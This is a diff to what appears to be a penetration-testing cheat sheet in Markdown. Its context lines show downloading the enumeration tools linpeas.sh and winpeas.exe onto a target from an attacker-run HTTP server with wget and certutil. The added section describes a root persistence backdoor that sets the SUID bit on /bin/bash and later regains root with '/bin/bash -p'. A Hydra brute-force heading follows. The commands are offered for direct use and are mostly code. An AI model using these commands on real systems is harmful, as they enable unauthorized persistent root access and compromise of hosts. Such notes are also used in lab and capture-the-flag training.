@@ -270,13 +270,28 @@ python3 -m http.server 8080
 ```
 wget http://0.0.0.0:8080/linpeas.sh
 
-```
+``` 
 **Get install stuff in Windows target**
 
 ```
 certutil.exe -urlcache -f http://0.0.0.0:8080/winpeas.exe
 
 ```
+## Root Shell Persistence Backdoor via Bash
+
+Run this command on your root shell to give permissions:
+```
+sudo chmod +s /bin/bash
+```
+Now, whenever you access this system again, run this command:
+```
+/bin/bash -p
+```
+
+
+
+
+
 # Brute-Force Attack
 **Use Hydra to Brute-Force Login page**
 ```
